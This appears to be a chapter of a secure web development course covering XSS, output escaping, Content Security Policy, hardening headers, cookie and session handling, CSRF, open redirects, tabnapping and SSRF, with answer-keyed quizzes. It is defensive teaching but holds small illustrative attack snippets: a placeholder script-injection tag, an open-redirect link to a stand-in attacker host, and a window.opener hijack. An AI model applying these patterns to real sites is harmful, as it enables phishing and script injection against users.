Make sure that you tell the receiver exactly how to interpret the output. Otherwise, if it includes data from an attacker, the attacker might be able to fool the recipient into interpreting it the wrong way. This is an especially common problem in web applications:

* Clearly state the MIME type of the data that is being sent. Browsers can guess, but they may guess wrong.

* Clearly state the character encoding of the output that is being sent. Don’t make the receiving program guess the character encoding! If the receiving program (typically the web browser) has to guess, the attacker may fool your system into sending material that leads to a wrong guess and eventually an attack. If you are sending HTML, usually you should tell the recipient that it is UTF-8. The best way to do that is via the HTTP **charset** option, which you can often do with a simple configuration option. If you cannot control that for some reason, include that information in the HTML **&lt;head&gt;**, e.g., **&lt;meta http-equiv="Content-Type” content="text/html; charset=UTF-8"&gt;**.

More generally, you often need to **_escape your output_** so that any data you generate that might be influenced by an attacker cannot become an attack. This is an especially common problem in web applications. One of the most common vulnerabilities in web applications is called *Cross-Site Scripting* (XSS). This problem is all about not sending output properly and, in particular, about escaping output correctly. The next unit will explain the vulnerability and how to deal with it.

#### Quiz 4.1: Introduction to Sending Output

\>\>Do not waste space telling a receiving web browser the data type or encoding being sent, as browsers do an excellent job at automatically determining this information. True or False?<<

( ) True

(x) False

[Explanation]

This is false. Web browsers do an excellent job at automatically determining this information when there is no attack, but attackers can be very crafty at supplying data specifically designed to fool receiving programs’ heuristics. Instead, where options exist, you should send information to recipients to tell them exactly how to interpret the data, such as its data type and encoding.

[Explanation]

### Countering Cross-Site Scripting (XSS)

[Web application]

#### The XSS Problem

One of the most common vulnerabilities in web applications is a Cross-Site Scripting (XSS) vulnerability. In an XSS attack, the attacker tries to fool a web browser to do something malicious (usually to run malicious code) by inserting information into a valid web page or web application that will be misinterpreted by the receiving browser as some sort of malicious action. It is always abbreviated as XSS, because CSS already has another meaning (Cascading Style Sheets). XSS is an especially common problem in pages or sites that allow user comments, because user comments are an easy vector for attackers to insert their malicious information.

The fundamental problem is that web browsers (which operate as clients) must presume that if they were sent some data, the sender intended to send it. After all, what else could the web browser presume? However, if the sender creates that data by combining constant data it controls with attacker-provided data, and the attacker-provided data is not properly sanitized, then the combination could become malicious. The mishmash of this combination would then be interpreted by the web browser as a request to do something malicious, which it then dutifully does.

For example, if the web server sends HTML embedded with a string from an untrusted user, and an attacker arranges for that string to contain **&lt;script&gt; do_something_malicious(); </script>**, the user might end up running the JavaScript program **do_something_malicious()**.

In XSS, the system that is eventually attacked is the *web browser*. However, the *cause* of the attack is improper code written in the *sender* of the data to the web browser. There are three common patterns for XSS:

* **Persistent Store**<br>The malicious data is stored in a database for later retrieval. For example, an attacker submits a comment with an embedded malicious script; when someone else uses their web browser to view the comments, the web browser runs the malicious script.

* **Reflection**<br>The malicious data is sent by the victim’s web browser to the server (typically inside a URL) and immediately reflected back to the browser.

* **DOM-based**<br>The web client sends the attack data to itself, typically using data provided from an attack and then sent via the DOM using JavaScript.

🔔 XSS is such a common mistake in web applications that it is 2017 OWASP Top 10 #7. XSS is considered part of 2021 OWASP Top 10 #3 (Injection) in its 2021 edition. It is also 2019 CWE Top 25 #2 and 2021 CWE Top 25 #2. In CWE it is [CWE-79](https://cwe.mitre.org/data/definitions/79.html), *Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)*.

#### The XSS Solution: Escape Output

The standard way to counter XSS is to escape all output that might be from an attacker and is not specifically approved. In many ways, this is the best countermeasure. Done right, it completely counters the attack and is very flexible. For example, if you have untrusted HTML data from an attacker, apply the standard HTML escapes unless you have a good reason to do otherwise:

**Standard HTML Escapes**

<table>
  <tr>
    <td>Original</td>
    <td>Escaped HTML</td>
  </tr>
  <tr>
    <td>&amp;</td>
    <td>&amp;amp;</td>
  </tr>
  <tr>
    <td>&lt;</td>
    <td>&amp;lt;</td>
  </tr>
  <tr>
    <td>&gt;</td>
    <td>&amp;gt;</td>
  </tr>
  <tr>
    <td>"</td>
    <td>&amp;quot;</td>
  </tr>
  <tr>
    <td>‘</td>
    <td>&amp;#39; or &amp;apos;</td>
  </tr>
</table>


In output sanitizing, just like input validation, it is often best to identify an allowlist and escape the rest. However, sometimes required output escapes are a well-defined list that you can directly apply, because sometimes you *can* safely enumerate the categories as we have done here for HTML. There are technically cases where you don’t have to apply the escapes to untrusted data, but in HTML it is often simpler and faster to just automatically apply them all unless you have a specific need to permit something else. Of course, these are only the escapes for HTML itself; these are not enough by themselves for other data formats (such as embedded URLs and HTTP headers).

Here is the problem: You have to be *perfect*. If you escape output correctly 99.9% of the time, and you generate output in 1,000 places, your program is *vulnerable*. You may be a genius, but that is not relevant; even geniuses make mistakes. Even if the software was *originally* perfect, a later change can easily introduce a vulnerability. We need a better solution than “*never make a mistake that is easy to make*” - especially when something happens over and over again.

In most cases, the best solution for XSS is to **_choose a framework or library that automatically escapes HTML output for you_**. That way, the output escaping is done, but you don’t have to constantly think about it. Instead, the output system automatically escapes the output for you (this is sometimes called *auto escaping*). This escaping is typically done using one of the many templating systems available that let you specify the constant template (which is trusted and therefore goes through unescaped) and the data (where untrusted data is escaped by default).

There are lots of options that do this. The JavaScript library React, for example, escapes by default any values embedded in its JSX language before rendering it. Ruby on Rails escapes HTML values by default when using its ERB templates. The Python web framework Flask uses the Jinja template library to render templates, and Jinja autoescapes data rendered in an HTML template. This is absolutely not a complete list; auto escaping is a very common capability in web frameworks. We strongly recommend that you only choose web frameworks and output libraries that will escape HTML by default; there are many good ones to choose from.

#### When You Need to Allow Unescaped Untrusted Data

Occasionally you *do* need to allow unescaped data through. One reason you might *want* to omit some escapes is that you want untrusted data to have some action that escaping would prevent. For example, let’s say that you want untrusted users to provide HTML that will italicize some of their text. In that case, you will want to let **&lt;i&gt;** and **&lt;/i&gt;** (italics) through, even though you would normally escape the **&lt;** and **&gt;** characters.

The problem is that once you allow anything additional through, the code necessary to properly escape output is much more complicated. For example, you need to make sure that every opening tag (**&lt;i>**) has a matching tag, that they nest properly, that they either don’t have attributes or those attributes are themselves allowed, and that only the tags and attributes that you allow are let through. There are many cases where this becomes a vulnerability. After all, many frameworks escape data by default, but when developers need to let something through, they sometimes allow *too much* through.

In that case, where possible, use libraries *already designed* to allow only what you want, and escape everything else. Most widely-used programming languages and frameworks already have libraries that let you state what to let through, and then escape, strip, or forbid the rest.

#### URLs

We have focused on escaping HTML, because that is the biggest problem in web applications. But HTML can embed other kinds of data, and of those, perhaps the most common are URLs.

Embedded URLs must also be escaped, and the rules for escaping URLs are different. The URL syntax is generally **scheme&#58;[//authority]path[?query]&#8202;[&#35;fragment]**. For example, in the URL **<https://www.linuxfoundation.org/about/>**, the scheme is “**https**”, authority “<b>www.linuxfoundation.org</b>”, path is “**/about/**”, and this example has no query or fragment part. Sometimes you need special characters in the path, query, or fragment. The conventional way to escape those parts of the URLs is to first ensure the data is encoded with UTF-8, and escape as “**%hh**” (where **hh** is the hexadecimal representation) all bytes except for “safe” bytes, which are typically **A-Z**, **a-z**, **0-9**, “**.**”, “**-**”, “**&#42;**”, and “**&#95;**”. The Java routine **java.net.URLEncoder.encode()** turns all spaces into “**+**” instead of “**%20**”; both the “**+**” and “**%20**” conventions are in wide use.

#### XSS Alternatives

You should normally use a framework that automatically escapes HTML by default.

If for some reason you can’t, you can build a wrapper that does the escaping for you and sends the output. A wrapper is riskier if it is easy to not call the wrapper. If you do use a wrapper, the wrapper should also perform the output. If you separately call an escape routine and then call to produce output, then it is especially easy to forget to call the wrapper. E.g., if you do **SendOutput(EscapeHTML(data))**, it will be far too easy to use the vulnerable **SendOutput(data)** instead.

An alternative sometimes suggested is to use very harsh input filtering that prevents all HTML metacharacters (**&amp; &lt; &gt; &quot; &#39;**). In theory, this prevents XSS in HTML. If you *can* limit your input like this, you should do so, since you should always limit your untrusted inputs as much as possible. In practice, while harsh input filtering can help counter other attacks, it is usually *not* enough to counter XSS. The problem is that usually some inputs eventually have to allow some HTML metacharacters. For example, an O’Malley would be unhappy with a system that did not allow single quotes in a name. Even a system that starts with this limitation often outgrows it, so you cannot count on harsh input validation *by itself* to counter XSS. Yes, use harsh input validation where you can as a hardening measure - but it’s not enough to counter XSS.

A very mild hardening measure is to set the attribute **HttpOnly** on cookies. That way, if a malicious script is run, it cannot see the cookie value. You *should* set this limitation when you can, because it limits privilege, but this is a very mild hardening measure that is only useful if you apply *other* measures as well.

XSS is usually best countered by choosing a framework or library that automatically escapes output for you. However, programs often have many outputs. It would be best if we paired this solution with something else that limited the damage when a mistake *is* made. On the web there is a solution: the Content Security Policy (CSP). The next unit will discuss this.

#### Quiz 4.2: Countering Cross-Site Scripting (XSS)

\>\>Choosing a framework or library that automatically escapes HTML output is often one of the best ways to counter XSS attacks. True or False?<<

(x) True

( ) False

[Explanation]

This is true. Many web applications generate many fragments of HTML, and it is impractical to remember to manually escape every one of them. Instead, use a system that automatically escapes them. In some cases, you will need to override this, but these overrides can be carefully reviewed on each use to ensure that they are secure.

Of course, other measures can help as well, but having secure *programming* defaults means that there are usually fewer problems in the first place.

[Explanation]

### Content Security Policy (CSP)

[Web application]

When creating web applications, a really important tool for limiting damage is a *Content Security Policy* (CSP). If it exists, the CSP tells the receiving web browser what is allowed and not allowed from a security perspective. CSP by itself does not prevent most attacks, but can make many vulnerabilities harder to exploit or greatly reduce their impact. That makes CSP an important *defense in depth measure* to reduce risk.

Normally a reference to the CSP is sent as an HTTP header (called **Content-Security-Policy**), and like all HTTP headers, the user receives it *before* the user receives the main content. You can also send CSP information as a **&lt;meta&gt;** HTML element with the **http-equiv** attribute set to **Content-Security-Policy**. However, using the **&lt;meta&gt;** element is not as good as using the HTTP header, because the system has already started processing the HTML by this point. So try to use the HTTP header instead. If you have to use CSP via an HTML element, include this **&lt;meta&gt;** element as soon as you can in your HTML, so that it will take effect as soon as possible.

Perhaps the most important CSP capability is that CSP can control which scripts are allowed to run. By default, a web browser runs all scripts sent to it. This is terrible if there is an XSS vulnerability, because the attack may be able to sneak code into the page and have the victim’s web browser run it. A better secure solution is to separate the code from the data and limit privilege. We can do this with CSP.

Here is a simple CSP that prevents a large number of attacks. This CSP says that resources (in particular scripts and styles) are only from the source site (**&#39;self&#39;**), and that **inline** or **evals** for scripts and styles are not allowed (because they have not been specifically permitted):

**Content-Security-Policy: default-src ‘self';**

The challenge with this CSP is that to use it to its full potential, we need to *stop* using inline styles and scripts. The HTML can request the *loading* of JavaScript files and CSS styles, but the JavaScript and CSS styles must be in separate files. The HTML may include lots of information important to scripts and styles (such as the **tag**, **class**, and **id**), but the HTML cannot embed scripts and styles directly.

Never using inline scripts and styles is widely considered good practice, but it is more than that; it dramatically improves security. If inline scripts and styles are ignored, then an XSS attack that subverts an HTML web page *cannot* easily cause an untrusted script or style to be used. This does not prevent all attacks, but it does prevent many, and it makes other attacks dramatically harder. If you can *stop* using all inline scripts and styles, and enforce that through your CSP, the system becomes more resistant to a range of attacks.

But what if this policy is too difficult to implement on a page, or does not meet your circumstance? That is not a problem; simply use a *different* CSP for that page. The CSP specification has a range of options that you can use to permit more operations and restrict others.

As always, your goal is least privilege: try to make the CSP as restrictive as you can. You will often get the most benefit if you modify your system so it can use a more restrictive CSP on all pages, but even a small restriction can have some benefits. Common ways to relax the limitations on scripts and styles are:

1. Have a restrictive CSP on as many web pages as you can, such as only allowing scripts and styles from specific locations on your website (never inline). Then relax the restrictions on pages where that is currently difficult.

2. Allow loading scripts and styles from specific other sites. You can set **default-src** (where script source files are loaded) to allow specific other websites you list. This tells the web browser that you fully trust those specific sites. Be careful; this can hurt user privacy. For example, each organization that manages those other sites will know at *least* whenever a user retrieves that information and their IP address.

3. Allow specific hashes. You can set **default-src** to allow a specific inline program by saying that its cryptographic hash can be executed using the format **‘&lt;hash-algorithm&gt;-&lt;base64-value&gt;’**. This can be a useful intermediate step if you have existing inline scripts, though in the long, term it would be better to move those scripts to a separate file.

CSP has various other mechanisms to limit privileges. Another CSP parameter that is especially important is **frame-ancestors**, which is a great tool for countering clickjacking attacks. A clickjacking attack is one where an attacker can “hijack” a click that the user intended for one purpose, but in fact the click was “hijacked” to do something else. Attackers typically do this by misusing HTML’s frame capabilities. If you don’t use frames - and most sites don’t - you can easily fix this by including “**frame-ancestors ‘none';**” in your policy. If you do use frames, then use “**frame-ancestors ‘self';**” instead.

When you are developing a site it might be wise to go through the CSP specification and try to maximally limit what you ask web browsers to allow. The less you allow, the less attackers can do if you make a mistake. There are other HTTP headers that can help harden a site against attack; in the next unit we will look at a few.

#### Quiz 4.3: Content Security Policy (CSP)

\>\>Using a CSP setting that forbids inline scripts, requires that JavaScript only be executed from specific trusted locations, and moving all JavaScript to separate files into those locations can reduce the impact of cross-site scripting (XSS) attacks. True or False?<<

(x) True

( ) False

[Explanation]

This is true. CSP does not eliminate all problems, but CSP does let you forbid inline scripts and instead require JavaScript to be loaded from specific trusted locations. In this configuration, XSS attacks can no longer easily insert malicious JavaScript code, and that can reduce the impact of XSS attacks.

[Explanation]

### Other HTTP Hardening Headers

[Web application]

When you are delivering web pages you can limit what can be done with the results, making it harder for attackers to cause serious damage. In short, there are other HTTP headers that you can set that can sometimes harden your applications against attacks. We have already discussed the Content Security Policy (CSP), which is perhaps the most important one. Here are some other HTTP headers you should consider using:

* **X-Content-Type-Options**<br>This should be set to **nosniff**, which means that the MIME types provided are correct and that the receiver should not try to guess what the type is. This means that attackers won’t be able to fool the web browser into using a different type.

* **X-Frame-Options**<br>This should be set to **DENY** or **SAMEORIGIN**. Like the CSP **frame-ancestors**, this prevents the use of frames or only allows them from the origin, countering many clickjacking attacks. Technically, X-Frame-Options has been obsoleted by CSP **frame-ancestors**, but if you might have Internet Explorer (IE) users, you also need this as IE does not support CSP **frame-ancestors**.

* **HTTP Strict-Transport-Security (HSTS)**<br>This means that *only* the secured HTTPS protocol, and not the insecure HTTP protocol, is permitted for future visits to this site for a given number of seconds. A common setting is “**Strict-Transport-Security: max-age=31536000;**” which means that *only* HTTPS will be allowed for a year (the number is the number of seconds). A larger number is fine.

If your site is publicly accessible, you can easily test your headers using the [Security Headers website](https://securityheaders.com/).

Also, an important word about HTTP headers in general. You may decide, for various reasons, to provide other HTTP headers. If some of that header information might be from an attacker, be *especially careful*. As always, do very careful input validation. There is a nasty attack, in particular, where the attacker manages to insert a newline in the input; this will cause *HTTP header splitting* in HTTP versions 1.1 and 2, where the rest of the text after the newline may be interpreted as an HTTP header provided by the attacker. This could disable many protections or even implement an attack.

#### Quiz 4.4: Other HTTP Hardening Headers

\>\>When sending information using HTTP, you can set various HTTP headers (such as HTTP Strict-Transport-Security (HSTS)) to help harden your system against attack. True or False?<<

(x) True

( ) False

### Cookies & Login Sessions

[Web application]

An important mechanism in the HTTP protocol is support for *cookies*. Cookies are small chunks of data sent from a web server to a web browser. From then on, when the web browser contacts that web server, the web browser will send that cookie value back to the server it came from, subject to certain restrictions.

#### Cookie Attributes

Web servers can also set some attributes on the cookies they send. For example:

* Expiration time: If no expiration time is set, the cookie expires when the browser exits (such cookies are called *session cookies*). Otherwise, the browser may store the cookie permanently until the time expires (such cookies are called *permanent cookies* - a user *can* delete these cookies, but few do).

* **Secure** flag: If set, the cookie will only be sent to HTTPS servers, and not to HTTP. You should set this whenever practical.

* **HttpOnly** flag: The cookie is not visible to JavaScript programs. You should set this whenever practical.

* **SameSite**: This has three main values - **None**, **Lax**, and **Strict**. “**None**” means that cookies are always sent to the matching web server. “**Lax**” means that cookies are sent if they are a **GET** (click) on a third-party website, and otherwise cookies are only sent if the request comes from the same site. “**Strict**” means that cookies are only sent in a first-party context; any request from another website will *not* cause the cookie to be sent. Historically, the web browser default was effectively **None**, but modern web browsers now act with **Lax** as the default because this counters certain attacks. We will discuss this later, but you should set this to at least **Lax** wherever practical.

#### Cookies in Context

Cookies are not, by themselves, necessarily malicious. However, cookies can reveal who the requester is in some cases, making them a potential privacy issue. This is especially true for cookies that have **SameSite=None**. If someone sets up requests for this kind of cookie on many websites (e.g., by embedding third-party images), the cookie can be used to track that user’s actions across many sites. A cookie intended to track users across websites is called a *tracking cookie*. Tracking cookies can be even worse if they have a long expiration time, because such cookies persist after the browser exits. Tracking cookies have attracted the concerns of many nations because of their detrimental effect on user privacy. As a result, various laws have passed involving cookies and consent. However, implementing tracking cookies is not the only way to use cookies; cookies can also improve security.

Cookies are important in part because they are often used to implement login sessions on the world wide web (WWW). A login session is simply a period of activity between when a user logs in and logs out. The original WWW protocol did not have a way to implement login sessions, and cookies provide a simple mechanism to support login sessions.

#### Cookies and Login Sessions

On the web, a common way to implement a login session is to have a login form. If the login is successful, the web server sends a “**session id**” within a cookie value. The session id is simply a large random number that cannot be guessed by anyone else. From then on, the web browser then sends this cookie (with the session id) whenever it contacts that web server. The web server can check this session id to see who is making the request… and if that session id is valid, the web server looks up the user id for that session and allows the user to whatever the user is authorized to do. Including a session id in a cookie is **not** the only way to use cookies to support login, but it is a common approach.

Normally, when developing web applications, you will use a framework or library that (mostly) handles login sessions for you. This is fine, just check to ensure that it is secure. Here we will cover some key features to look for. In some cases, your framework won’t do it by itself, but you can take some additional steps to make them happen.

First, if your framework uses session ids in cookies (a common approach), it is critical that the implementation does not allow attackers to guess or discover the session ids. If an attacker can get the session id, the attacker can act with the same privileges as the logged-in user! In this common case, check for these key factors at least:

1. The session identifier must have at least 128 bits of random data.

2. The session id must be created using a *cryptographically secure* pseudo-random number generator (CSPRNG). Anything guessable (like *“add one to the last session id”* or *“ordinary call to random()”)* is not acceptable. We will discuss this in more detail later.

3. Encrypt session ids between the web server and web browser. The usual solution is to set the cookie’s **Secure** flag and always communicate using HTTPS (TLS).

Second, set the attributes of cookies that contain session ids to be secure:

1. As noted earlier, where practical set cookies for login session handling with the **HttpOnly** flag. That way, JavaScript programs won’t have direct access to it. This is another example of least privilege; if a privilege is not needed, don’t provide the access.

2. Similarly, consider using session cookies (cookies with no expiration time) for cookies that store information on login sessions. You don’t have to do this; you can use permanent cookies to store session information. But if you use permanent cookies, consider limiting the time to at most a few days. Permanent cookies are stored in permanent storage, and an attacker might be able to gain access to that stored information.

Third, make sure that you have login and logout functions, and that they actually work correctly!

Whenever a user successfully logs in, make sure that the user *always* gets a *new* session id (this is typically returned in a cookie). In particular, the receiving side of a login must *never* reuse session values. A new login means a new session is being requested (even if there is already a current session), so make sure a new session is created and used for that request! If your program fails to create a new session for a new login, it may be vulnerable to a *session fixation attack*.

🔔 Session fixation is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #37. It is [CWE-384](https://cwe.mitre.org/data/definitions/384.html).

Similarly, make *sure* that you provide users a “log off” (“sign off”) action that *actually works*. If you use session ids - a common approach - then a log off should invalidate that session. This generally means that you need to remove the record of that session id from the server database that records active session ids (and the user id each session id applies to). You also need to tell the browser to delete the cookie or at least the session id value in that cookie. That way, the user is actually logged out. Users log out to reduce their risks, but this does not work if the application does not actually log them out. A surprisingly large number of major sites have, at one time or another, not logged out users when they requested it.

You should also eventually log out an inactive session automatically. Some easy ways to do that are to not set an expiration date (so the user will log out when they shut down their browser) or set an expiration date for when the user will be logged out. Frameworks will typically let you configure this easily.

#### Quiz 4.5: Cookies & Login Sessions

\>\>When a user logs in again, reuse the session id if session ids are used and already present, to reduce confusion to the user. True or False?<<

( ) True

(x) False

[Explanation]

This is false. If a user is logging in again, they are asking for a new session. Honor that request by creating a new session!

Reusing an existing session can, in some implementations, open a system to an attack called session fixation. We have not gone into the details of session fixation in this course, but that is because the countermeasure (“don’t reuse session ids”) is much easier to explain than the attack.

[Explanation]

### CSRF / XSRF

[Web application]

Another kind of attack that websites have often been vulnerable to is called cross-site request forgery (CSRF or XSRF). It is less of a problem today, but it can still happen, so let’s learn what it is and how it can be countered. CSRF is also a great example of how specific security vulnerabilities can become less common over time; if you can, try to find general ways to eliminate other kinds of vulnerabilities!

In a CSRF attack, an attacker tricks the user into sending data to a *server*, where the server interprets the request as a request from the user and directly acts on it. For example, the attacker could create a form with a submit button on the attacker’s website, but tell the user’s web browser to submit the completed form to a server that will act on that form. Note that if the user is logged in to that server (say for a bank), the server will see that the user really is logged in to the bank, and might be convinced to do something the user did not intend (such as transfer a lot of money to the attacker).

In some ways, a CSRF attack is the opposite of an XSS attack. XSS exploits the user’s trust in a server; CSRF exploits the server’s trust in a client (that the user is actually intentionally making a given request). Put another way: XSS fools clients; CSRF fools servers.

A common countermeasure used today in most widely-used web application frameworks is to send a secret user-specific CSRF token in all forms and any other URLs with side-effects, and then check to ensure that the correct secret is included with any request with a side-effect. Since attackers will not know the secret value, the attacker cannot insert a matching CSRF token. Since this is built into almost all widely-used web frameworks today, many applications are automatically protected from CSRF (unless they disable the protection or don't use the framework correctly). You should prefer a web application framework that has a CSRF token mechanism.

Another common countermeasure used today is what are called **SameSite** cookies. Historically, all cookies were sent to a server whenever the user had matching cookies for that server, even when the primary page being displayed was from a different server. For example, a web page on site BB might include a reference to an image on site CC; when the web browser downloaded the image from CC it would send all related cookies. However, this does not really make much sense; in many cases cookies should not be sent if the interaction was caused by an unrelated server. So modern browsers have an optional **SameSite** setting on cookies. If the setting is **Lax** or **Strict**,  a request caused by an attacker on a different server will not cause the cookie (like a session) to be sent. So as long as your session cookies have a **SameSite** setting of **Lax** or **Strict**, CSRF attacks generally don’t work. Even better, modern browsers are working to make **SameSite=Lax** the default. It is best to set **SameSite** to **Lax** or **Strict** yourself, but a secure default is still a good thing.

In short, CSRF vulnerabilities are becoming less common because the industry is moving towards safe defaults. This shows it is *possible* to reduce the likelihood of entire classes of vulnerabilities by designing or modifying systems so that the default is secure. Where possible, build countermeasures into your tools/standards/system so the problem won’t occur. If you are building a new web application, it is much less likely to be a problem, but make sure that your web framework counters it and that you use its mechanisms correctly.

🔔 Although it’s becoming less common, Cross-Site Request Forgery (CSRF) is still a common enough cause of security vulnerabilities that it is 2019 CWE Top 25 #9. It is also identified as [CWE-352](https://cwe.mitre.org/data/definitions/352.html). It used to be in the OWASP Top 10. It is not in the 2017 edition, because so many modern frameworks now prevent it, but it is still important if your software is vulnerable to it.

Of course, there are other ways an attacker might be able to gain temporary control over a user’s system. So you might still want to implement some other traditional CSRF countermeasures, such as:

1. Automatically log off users after some period of time, or some time of inactivity.

2. If an action is especially dangerous (e.g., account deletion or moving a large sum of money), require a separate additional authenticated confirmation that the user really is requesting it. This is good anyway, because there are many ways an attacker might be able to temporarily gain control over an account; limiting the impact is all part of managing risk.

#### Quiz 4.6: CSRF / XSRF

\>\>CSRF vulnerabilities are less common today because web application frameworks and web browsers generally have countermeasures to make these vulnerabilities less likely. True or False?<<

(x) True

( ) False

[Explanation]

This is true! This shows that sometimes it *is* possible to modify systems to reduce the likelihood of whole classes of attacks. You should also continuously look for ways to eliminate entire classes of attacks, either in your specific application or the world in general.

[Explanation]

### Open Redirects and Forwards

[Web application]

A web application should not accept user-controlled input that specifies a link to some site on a different server and then, without strict controls, use that link to do a redirect. A web application that does this has an *open redirect*.

This can be hard to understand, so let’s look at an example. Let’s imagine that a server-side web application has a “**/redirect**” link that accepts a parameter **url=**, and then simply redirects requests to the **url= value**. That means that an attacker could create an HTML file anywhere that looks like this (the example is based on text in MITRE’s text on [CWE-601](https://cwe.mitre.org/data/definitions/601.html)):

<b>&lt;a href=&quot;https&#58;//bank.example.com/redirect?url=https&#58;//attacker.example.net"&gt;Click here to log in&lt;/a&gt;</b>

What is the problem? The problem is that a user who checked the link would think that this link went to a trusted domain (e.g., **bank.example.com**). While technically that is true, when clicked, the supposedly trusted domain will quietly redirect the user to some other domain that might be dangerous and not what the user expected (e.g., **attacker.example.net**). More generally, the problem is that an open redirect can be used to fool humans and create stronger phishing attacks. Humans can be lulled into thinking they are going to a trusted domain, without realizing that they will in fact be immediately transferred to an untrusted domain. In theory, the users should also check *where they are now* on each page, but busy humans often don’t do that. We want to make it harder, not easier, to fool busy humans.

A related problem is a “forward”, where the web application forwards the request to some other part of the web application. The web application might incorrectly view the request as an *internal* request from the web application itself, instead of more accurately coming from an external user, and give it unwarranted privileges.

The [OWASP cheat sheet on unvalidated redirects and forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) discusses various possible countermeasures:

* *“Simply avoid using redirects and forwards.*

* *If used, do not allow the URL as user input for the destination.*

* *Where possible, have the user provide [a] short name, ID or token which is mapped server-side to a full target URL.*

  * *This provides the highest degree of protection against the attack tampering with the URL.*

  * *Be careful that this doesn’t introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets*

* *If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.*

* *Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).*

  * *This should be based on an allowlist approach, rather than a denylist.”*

🔔 Open redirects are such a common cause of security vulnerabilities that this weakness is 2021 CWE Top 25 #37 and 2019 CWE Top 25 #32. It is [CWE-601](https://cwe.mitre.org/data/definitions/601.html).

#### Quiz 4.7: Open Redirects and Forwards

\>\>It is fine to support a redirector URL, e.g., **<https://bank.example.com/redirect?url=https://dangerous.example.com>**, as long as the URL is carefully sanitized to only allow trusted URLs. True or False?<<

(x) True

( ) False

[Explanation]

This is true! The problem is not redirection, it is *unvalidated* redirection. Of course, if you don’t allow redirection at all, that is even safer, but at the very least it is important to validate the redirection to ensure that it is a value you expect.

[Explanation]

### HTML **target** and JavaScript **window.open()**

[Web application]

There is a peculiar problem with some special uses of the HTML **target** attribute and JavaScript `window.open()` that many web developers are not aware of. Let’s explain the problem and some solutions.

In HTML, **&lt;a href=...&gt;** creates a hyperlink. The HTML construct **&lt;a href=... target=...&gt;** creates a hyperlink where, if you click on it, it creates a new named “target”. Using **target="&#95;blank”** creates the target in a new tab. Historically setting **target="&#95;blank”** could be a vulnerability, but the [HTML specification has been modified so **&#95;blank** is no longer a problem](https://html.spec.whatwg.org/#following-hyperlinks) and modern browsers implement this fix.

However, there's a special case you still need to worry about. If you do *all* of these things at the same time you may have a security problem:

1. Use HTML tag "a" with a named target or use JavaScript **window.open()** with a named target, *and*
2. The new page being loaded is from some (other) system that you don't totally trust, *and*
3. The named target is something *other* than the safe values **&#95;self** (the default for HTML's a tag), **&#95;blank** (the default for JavaScript's **window.open()**), **&#95;parent**, or **&#95;top**.

Where possible, when loading pages from other sites, don't use named targets (other than the safe ones listed above). If you really must use this unusual circumstance, fix this in HTML by adding **rel="noopener"** to the "a" tag.

Explaining why this odd combination is a security problem is complicated. The underlying problem is that web browsers need to support legacy systems. Fundamentally, when there is a named target, the browser will re-use an existing window by that name, or create one if there aren't any. The browser will then provide that window with an "opener" value set to its requestor. This was a common pattern for older websites to implement pop-ups. This approach is fine if the named window is trusted by the requestor. However, this provides a mechanism for the newer page to manipulate the web page of its caller. This enables, for example, "tabnapping", where the new site tricks the user by controlling another tab. If no countermeasure is taken, the receiving page can do things like force the *calling* page to navigate to a different page (e.g., **window.opener.location.href = newURL**), provide a new page that looks like the old one (even though it is in a different place), and fool the user into doing something on the “same” page that is not the same at all.

This used to be a more common problem, because at one time this also impacted **&#95;blank**. Today browsers automatically add **rel="noopener"** when **&#95;blank** is the target. The other "safe" named targets (listed above) are from the same origin, so again the problem can't happen. But if you use one of these less-common cases, you must handle it yourself.

You may see some older documents recommending the use of **rel="noreferrer"**. You don't need to do that any more as long as you don't change the browser's default referrer value. Modern browsers by default now have a setting of "strict-origin-when-cross-origin"; that means that when a different origin is loaded, the new origin sees the domain but *not* the path or other details about the page the user was viewing before. As long as you're happy with that default, or set an even stricter one, you're fine. However, if you set a looser value (and be careful before doing that), **rel="noreferrer"** will prevent that detailed information from getting to the other site in that specific case. You can combine **noopener** and **noreferrer** as **rel="noopener noreferrer"**. You should, in general, try to use secure defaults instead of trying to separately set a secure value on each use.

A historical discussion of these problems, before the defaults were changed, can be found in [*Security Vulnerability and Browser Performance Impact of Target=”&#95;blank”*](https://medium.com/@darrensimio/security-vulnerability-and-browser-performance-impact-of-target-blank-80e5e67db547) by Darren Sim, 2019.

#### Quiz 4.8: HTML **target** and JavaScript **window.open()**

\>\>In an HTML anchor (**&lt;a href=...>**) to another site, if you use **target=...** with a value such as **new&#95;window**, be sure to also set “**rel**” to "**noopener**" or “**noopener noreferrer**” to prevent control by that other site of the originating tab. True or False?<<

(x) True

( ) False

[Explanation]

This is true! Yes, this is a weird and subtle point. There has been progress on making this less of a problem; changes to handling of **&#95;blank** have made this much less common. There is reason to hope that future developments in HTML and JavaScript will completely close this unexpected security hole, but for now, we want you to know about it.

[Explanation]

### Using Inadequately Checked URLs / Server-Side Request Forgery (SSRF)

A Uniform Resource Locator (URL) is a way to refer to a specific web resource by location. Technically, a URL is a specific type of Uniform Resource Identifier (URI), but for our purposes we will use the terms interchangeably. As specified in [IETF RFC 3986](https://tools.ietf.org/html/rfc3986), a generic URI has this syntax:

**scheme:[//authority]path[?query]&#8202;[&#35;fragment]**

And **authority** has this syntax:

**[userinfo@]host[:port]**

Sometimes untrusted users will give you data that you want to use as a URL (or turn into a URL) to request more information. However, this can be dangerous. If you include a URL in data you present to a user, they might do the equivalent of clicking on it. It turns out that URLs are powerful things, and an attacker might try to exploit any of their capabilities. For example:

* A URL need not use the **https:** scheme; it might have other schemes like **file:** (to retrieve a local file) or even relatively obscure schemes like **gopher:**.  One sneaky attack is to request one scheme (like “**gopher:**”) to a service that expects a completely different protocol; an attacker may be able to use this confusion to produce an attack.

* The “host” might not be what you expect; the host might refer to an arbitrary other computer or even the requesting computer.

* An attacker might provide **userinfo** (a user account name) and/or a port. The port, for example, allows a URL to request a connection on *any* port of a computer.

* A URL can even encode a variety of characters for any of this data.

If a server is fooled into requesting an inadequately checked URL, it is called a *server-side request forgery* (SSRF).

